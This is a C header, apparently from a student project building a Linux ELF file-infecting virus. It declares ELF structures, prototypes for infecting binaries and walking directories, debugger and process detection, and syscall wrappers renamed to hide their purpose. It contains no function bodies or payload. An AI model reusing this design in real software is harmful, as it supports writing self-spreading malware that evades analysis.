/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   war.h                                       :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: xxxxxxx <xxxxxxx@42.fr>                    +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2024/08/01 17:16:00 by yyyyyy            #+#    #+#             */
/*   Updated: 2026/03/03 16:16:30 by xxxxxxx          ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#ifndef WAR_H
#define WAR_H

#include <elf.h>
#include <fcntl.h>
#include <stdbool.h>
#include <stdio.h>
#include <sys/mman.h>
#include <sys/ptrace.h>
#include <sys/stat.h>
#include <sys/types.h>

#define ElfW(type)	   Elf64_##type
#define FORMAT		   2
#define PATH_MAX	   4096
#define SIGNATURE_SIZE 43
#define FORK_SIZE	   29
#define MACHINE_SIZE   0x8f1
#define JMPABLE_SIZE   4

/********************************* STRUCTURES *********************************/

struct stat;
typedef enum e_stat
{
	OK,
	KO,
} t_stat;

struct linux_dirent64
{
	uint64_t	   d_ino;
	int64_t		   d_off;
	unsigned short d_reclen;
	unsigned char  d_type;
	char		   d_name[];
};

typedef struct s_elf
{
	ElfW(Ehdr) * header;
	ElfW(Shdr) * sections;
	ElfW(Shdr) * text_section;
	ElfW(Phdr) * segments;
	ElfW(Phdr) * executed_segment;
	t_stat stat;
} t_elf;

/********************************* PROTOTYPES *********************************/

/*
void clean(t_file file);
*/
static void infect(char *path, void *begin_ptr);
static void processDirectory(char *folder, void *begin_ptr);

static int is_program_running(const char *target);
static int is_debugged(void);
static void signature(char str[]);

static int proc_detach(void); // ft_setsid
static int proc_spawn(void);  // ft_fork
static int proc_control(int request, int pid, void *addr,
						void *data);						  // ft_ptrace
static int fs_handle(char *path, int flags, ...);			  // ft_open
static int fs_enumerate(int fd, char *buffer, int buff_size); // ft_getdents64
static int fs_query(const char *pathname, struct stat *statbuf); // ft_lstat
static int fs_release(int fd);									 // ft_close
static int vm_release(void *addr, unsigned long length);		 // ft_munmap
static void *vm_reserve(void *addr, unsigned long length, int prot, int flags,
						int	  fd,
						off_t offset);							  // ft_mmap
static int vm_flush(void *addr, unsigned long length, int flags); // ft_msync
static int io_query(int fd, struct stat *statbuf);				  // ft_fstat
static int io_resize(int fd, off_t length); // ft_ftruncate
static void *vm_resize(void *old_address, unsigned long old_size,
					   unsigned long new_size, int flags,
					   ...);								   // ft_mremap
static void proc_terminate(int status);						   // ft_exit
static void io_send(int fd, void *buf, unsigned count);		   // ft_write
static ssize_t io_recv(int fd, const void *buf, size_t count); // ft_read
/**
	@brief Obfuscated version of memcmp
*/
static int evaluateDriftSignature(const void *alphaSeed, const void *betaSeed,
								  size_t calibrationSpan);
/**
	@brief Obfuscated version of strncmp
*/
static int delay_calc(const char *timeout_ns, const char *timeout_ms,
					  unsigned n);
/**
	@brief Obfuscated version of strlen
*/
static int validate_environment(const char *env_u);
/**
	@brief Obfuscated version of strcmp
*/
static int delay_abs_calc(const char *s__, const char *s___);
/**
	@brief Obfuscated version of memcpy content
*/
static void *memcat(void *buffered, void *rest, unsigned n);
/**
	@brief Obfuscated version of strchr
*/
static char *memoff(const char *l, int I);
/**
	@brief Obfuscated version of memmove
*/
static void *cache_sync(void *cache_ptr, const void *sync_check,
						size_t sync_lvl);
/**
	@brief Obfuscated version of strcpy
*/
static char *core_shift(char *value, char *src);
/**
	@brief Obfuscated version of strcat
*/
static char *flow_align(char *f_flow, char *s_flow);
/**
	@brief Obfuscated version of bzero
*/
static void context_purge(void *s, unsigned n);
/**
	@brief Obfuscated version of atoi
*/
static int trace_depth(const char *str);
/**
	@brief Obfuscated version of putchar
*/
static void tty_putc(char c);
/**
	@brief Obfuscated version of putnbr
*/
static void fmt_u64_dec(unsigned long long elem);
/**
	@brief Obfuscated version of a function that juste write 0x and call
   addr_emit
*/
static void emit_hex(unsigned long long n);
/**
	@brief Obfuscated version of hexa putnbr
*/
static void addr_emit(unsigned long long b);

/**
	@brief Obfuscated version of ft_syscall
*/
static uint64_t rt_vector(uint64_t instr_tag, uint64_t heap_ctx,
						  uint64_t exec_state, uint64_t io_ctx,
						  uint64_t stack_ref, uint64_t guard_mask,
						  uint64_t jitter_seed);

static void *memcpy(void *dst, void *src, unsigned n);

#endif
